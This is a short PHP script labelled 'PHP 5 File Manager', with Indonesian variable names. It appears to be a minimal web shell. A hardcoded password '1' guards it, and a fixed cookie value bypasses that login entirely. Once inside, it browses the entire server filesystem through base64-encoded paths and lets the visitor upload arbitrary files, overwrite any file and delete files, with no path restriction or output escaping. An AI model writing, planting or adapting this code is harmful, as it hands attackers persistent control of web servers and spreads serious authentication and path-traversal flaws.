<?php
session_start();
$kunci = "1";
$c_name = "1";

// Logout
if (isset($_GET['keluar'])) {
    session_destroy();
    setcookie($c_name, "", time() - 3600);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Login logic
if (isset($_POST['gembok']) && $_POST['gembok'] === $kunci) {
    $_SESSION[$c_name] = true;
    setcookie($c_name, "aktif", time() + 86400);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Auth Check
if (!isset($_SESSION[$c_name]) && (!isset($_COOKIE[$c_name]) || $_COOKIE[$c_name] !== "aktif")) {
    echo "<h3>ðŸ”’ Login</h3><form method='POST'><input type='password' name='gembok'><input type='submit' value='Masuk'></form>";
    exit;
}

$root = getcwd();
$peta = isset($_GET['peta']) ? base64_decode($_GET['peta']) : $root;
if (!is_dir($peta)) $peta = dirname($peta);

// Action: Upload
if (isset($_POST['aksi']) && $_POST['aksi'] == 'upload') {
    $target = $peta . '/' . $_FILES['muatan']['name'];
    if (move_uploaded_file($_FILES['muatan']['tmp_name'], $target)) echo "Selesai upload.";
}

// Action: Hapus
if (isset($_GET['aksi']) && $_GET['aksi'] == 'hapus') {
    $target = base64_decode($_GET['target']);
    if (is_dir($target)) {
        rmdir($target); // Hanya folder kosong di versi simple ini
    } else {
        unlink($target);
    }
    header("Location: ?peta=" . base64_encode($peta));
}

// Action: Simpan Edit
if (isset($_POST['aksi']) && $_POST['aksi'] == 'simpan') {
    file_put_contents(base64_decode($_POST['target']), $_POST['konten']);
    echo "Tersimpan.";
}

?>
<html>
<head><title>PHP 5 File Manager</title></head>
<body>
    <table width="100%" border="0">
        <tr>
            <td><h2>File Manager</h2></td>
            <td align="right"><a href="?keluar=1">Keluar</a></td>
        </tr>
    </table>
    <hr>
    
    <p>Lokasi: <b><?php echo $peta; ?></b></p>
    <p><a href="?peta=<?php echo base64_encode(dirname($peta)); ?>"> [ Ke Atas ] </a></p>

    <form method="POST" enctype="multipart/form-data">
        Upload: <input type="file" name="muatan">
        <input type="hidden" name="aksi" value="upload">
        <input type="submit" value="Upload">
    </form>
    <hr>

    <?php if (isset($_GET['aksi']) && $_GET['aksi'] == 'edit'): 
        $file_edit = base64_decode($_GET['target']);
    ?>
        <h3>Edit: <?php echo basename($file_edit); ?></h3>
        <form method="POST">
            <textarea name="konten" rows="20" style="width:100%"><?php echo htmlspecialchars(file_get_contents($file_edit)); ?></textarea><br>
            <input type="hidden" name="target" value="<?php echo $_GET['target']; ?>">
            <input type="hidden" name="aksi" value="simpan">
            <input type="submit" value="Simpan Perubahan"> 
            <a href="?peta=<?php echo base64_encode($peta); ?>">Batal</a>
        </form>
    <?php else: ?>
        <table border="1" width="100%" cellpadding="5" cellspacing="0">
            <tr bgcolor="#cccccc">
                <th>Nama</th>
                <th>Tipe</th>
                <th>Ukuran</th>
                <th>Aksi</th>
            </tr>
            <?php
            $items = array_diff(scandir($peta), array('.', '..'));
            foreach ($items as $item) {
                $jalur = $peta . '/' . $item;
                $enc = base64_encode($jalur);
                echo "<tr>";
                if (is_dir($jalur)) {
                    echo "<td><a href='?peta=$enc'><b>$item</b></a></td><td>DIR</td><td>-</td>";
                } else {
                    echo "<td>$item</td><td>FILE</td><td>" . filesize($jalur) . " bytes</td>";
                }
                echo "<td>";
                if (is_file($jalur)) echo "<a href='?peta=".base64_encode($peta)."&aksi=edit&target=$enc'>Edit</a> | ";
                echo "<a href='?peta=".base64_encode($peta)."&aksi=hapus&target=$enc' onclick=\"return confirm('Hapus?')\">Hapus</a>";
                echo "</td></tr>";
            }
            ?>
        </table>
    <?php endif; ?>
</body>
</html>
